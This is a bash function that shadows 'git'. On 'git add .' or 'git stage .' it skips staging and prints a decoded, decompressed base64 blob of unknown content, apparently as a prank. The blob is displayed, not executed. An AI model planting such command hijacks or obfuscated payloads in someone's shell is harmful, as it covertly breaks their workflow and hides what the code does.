git() {
    if [ "$1" = "add" -o "$1" = "stage" ]; then
        if [ "$2" = "." ]; then
            echo H4sIAG8APmcAA7VWO27kOBDNdQqCCd0AxXQJEtgLOGAHTpQRAoPNCphTbDgD2DvAAL5cn2RfUWqJkqiPZ7FEuyEV69X3VbUf//z9wOfjp8B5PF8es3R+HJ/KT6GwkImtuLivWT/RXTnY026eTz/KdH4U0o3s/fHxffys43tfybPNj19L6YT/vOhlobt2sadfJLYsweRiXYsy6XNlIcSiYrsN3JqocWBM4XOr21TszGlv6nUlmY3yfjK7ducu7upue4OugA1lxtXsl4QoEefqB6lUaLap9ld0m4LbCKZ4ni4+RfFYaHw/UR2TKN5rajWDpfyKbiPWp5rrsbS+DK9wfmmiKG09qNO1UGFffbNd2CPT1cTAItz3Wu2WLDwcwUtrac3ywuR6LP57QNUxOCvXer7mUtXjqQ/zz6Mhv7IxjlHLqzLiCvsPh3QpPZ//ff1SXIzpNqD/7fzZ/Iaz+Ca1ia3+vTiV1cKZL2KjlJFweiPf9NfAuo3S3IK3LjFetRfh2piojFKiTfeXW7LBdmQdSy8l3pLt26ehW6IQrFOOvIidvWYCuJ4MvnFuAXhrSQlHwQgh8RcvZKKFjDKxBWsDH6RhSQgXLHnDGt7r/syMThkrx8ORwIrLZmwg4x1BkM7MSAmt0CMY3baCMRyMM3hUo+nOhvuZmcTec1VQGzaTS+OccO4EKqUwSMX2FJXS2nP0XAmGXuiITsly4XWLflrGIWIP7JnfjO1fAH272bsDkA+LL2FbKXV88UG+pkAD7jIWnl+1kgbch76asHQJK0Yc8mS/LjNGFVjuQKnuaTjG5OKg4EOk4Fr+AjiTVoOYOZgosgWTfAYosTkOsXr+4gA8g5OekwOcOERfjx+4AS2VcdRwH9QzYjcOBNBSKIRhtmDcEtv2OWd153z41YR7piGGmtNSxHrGF9Xww2wQah6kYs+WOwdnFKLIExTYNYTMpfzohyw05inka7wDqrs7hLh2Adp2nL4MddkODYTKh2hUQFjgtNIJ7PY+ePbuhjvHe+j5wvDnsZPIMzjdO/aB+HJcXR58TAxXJNjphGE5odkd4uKZZrRG4o4b3sehInI27smWR419jzDlTAyhF6aBiL1rR0/GRxuedSM5n5IzwMJfZ/vY5AbCv5/wgwFCcelep0tWIazokFkaGRlmPG45f7cP5/YEplaXR4TrbAttN3TuAC4Su4OTPCVEwdnwTFCnofOhMiUTHOEz+XL8WHCUaNIeiufoCJ7HDPPL/pOMN1s4k12m9AFc2pBJbnvQVqlWRbmwzsv2FQvtr2/f2mrw2TqmtbqdAm/Ofj2l03HDbxKaVF/maK3zf/R6z0CUdkitq+9GsMLHnFn1lmfG7v5jE8Nd4nd/b+ki7s7u/vJF9PTgXwbQnZJp/gUcQzoNlRIAAA== | base64 -d | gzip -d
        else
            command git "$@";
        fi
    else
        command git "$@";
    fi;
}
